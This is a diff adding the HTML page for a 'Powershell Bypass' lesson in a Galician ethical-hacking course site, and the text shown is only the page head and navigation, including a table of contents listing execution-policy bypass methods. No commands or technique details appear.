@@ -1,0 +1,2225 @@
+
+<!doctype html>
+<html lang="gl" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../desactivar-windows-defender/">
+      
+      
+        <link rel="next" href="../nishang/">
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.22">
+    
+    
+      
+        <title>Powershell Bypass - Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.84d31ad4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../css/custom.css">
+    
+      <link rel="stylesheet" href="../../../../css/opera.css">
+    
+      <link rel="stylesheet" href="../../../../css/print.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#evasion-de-politicas-de-execucion-en-powershell" class="md-skip">
+          Ir ao contido
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabeceira">
+    <a href="../../../.." title="Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos" class="md-header__button md-logo" aria-label="Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Powershell Bypass
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Cambiar a modo oscuro"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo oscuro" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="Cambiar a modo normal"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo normal" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Procura" placeholder="Procura" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Procurar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpar" aria-label="Limpar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando procura
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Pestanas" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  De interese
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../consideracions/" class="md-tabs__link">
+          
+  
+  
+  Apuntamentos
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../practicas-taller/doc-vulnyx-pivoting-war-basic/" class="md-tabs__link">
+          
+  
+  
+  Prácticas Taller UD3
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navegación" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos" class="md-nav__button md-logo" aria-label="Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    De interese
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Apuntamentos
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Apuntamentos
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../consideracions/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Consideracións
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Tips
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Tips
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_1" id="__nav_2_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Pivoting
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Pivoting
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../proxychains_pivoting_doc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Proxychains e SOCKS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_2" id="__nav_2_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    GNU/Linux
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            GNU/Linux
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../restauracion-tty-linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    TTY non interactiva
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../rlwrap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    rlwrap
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../uids-syscalls-wrappers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    UIDs, Syscalls e Wrappers de Persistencia
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_3" id="__nav_2_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Windows
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Windows
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../referencias/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Referencias
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ataques-kerberos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Ataques Kerberos
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../desactivar-windows-defender/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Desactivar Windows Defender
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Powershell Bypass
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Powershell Bypass
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Táboa de contidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Táboa de contidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introducion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Introdución
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#preparacion-script-de-exemplo" class="md-nav__link">
+    <span class="md-ellipsis">
+      Preparación: Script de Exemplo
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#comprobar-o-estado-actual" class="md-nav__link">
+    <span class="md-ellipsis">
+      Comprobar o Estado Actual
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Comprobar o Estado Actual">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#orde-de-prioridade" class="md-nav__link">
+    <span class="md-ellipsis">
+      Orde de Prioridade
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tipos-de-politicas" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tipos de Políticas
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#metodo-1-cambio-de-ambito-process-scope" class="md-nav__link">
+    <span class="md-ellipsis">
+      Método 1: Cambio de Ámbito (Process Scope)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#metodo-2-flags-de-lina-de-comandos" class="md-nav__link">
+    <span class="md-ellipsis">
+      Método 2: Flags de Liña de Comandos
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#metodo-3-execucion-en-memoria-fileless" class="md-nav__link">
+    <span class="md-ellipsis">
+      Método 3: Execución en Memoria (Fileless)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Método 3: Execución en Memoria (Fileless)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#pipe-desde-get-content" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pipe desde Get-Content
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#descarga-e-execucion-remota" class="md-nav__link">
+    <span class="md-ellipsis">
+      Descarga e Execución Remota
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#metodo-4-bypass-por-codificacion-encodedcommand" class="md-nav__link">
+    <span class="md-ellipsis">
+      Método 4: Bypass por Codificación (EncodedCommand)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Método 4: Bypass por Codificación (EncodedCommand)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-preparar-o-comando-escolle-a-tua-plataforma" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Preparar o comando (Escolle a túa plataforma)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-executar-na-vitima" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Executar na vítima
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#resumo-de-tecnicas" class="md-nav__link">
+    <span class="md-ellipsis">
+      Resumo de Técnicas
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#referencia-oficial" class="md-nav__link">
+    <span class="md-ellipsis">
+      Referencia oficial
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nishang/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Nishang
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Prácticas Taller UD3
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Prácticas Taller UD3
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Pivoting
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Pivoting
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/doc-vulnyx-pivoting-war-basic/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows / Linux
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/doc-vulnyx-pivoting-basic-war/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Linux / Windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    VulNyx
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            VulNyx
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/vulnyx/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introdución
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_2" id="__nav_3_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Prácticas Taller
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Prácticas Taller
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_2_1" id="__nav_3_2_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Fase 5. Persistencia. Máquinas virtuais nivel Low, so Linux
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Fase 5. Persistencia. Máquinas virtuais nivel Low, so Linux
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/indice_vulnyx_low_linux_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Índice
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/practicas-taller-vulnyx-persistencia/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Máquinas VulNyx
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_2_2" id="__nav_3_2_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Fase 5. Persistencia. Máquinas virtuais nivel Low, Easy, Medium, so Windows
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Fase 5. Persistencia. Máquinas virtuais nivel Low, Easy, Medium, so Windows
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/indice_vulnyx_low_windows_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Índice Low
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/indice_vulnyx_easy_windows_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Índice Easy
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/indice_vulnyx_medium_windows_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Índice Medium
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/practicas-taller-windows-persistencia/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Máquinas Vulnyx
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  
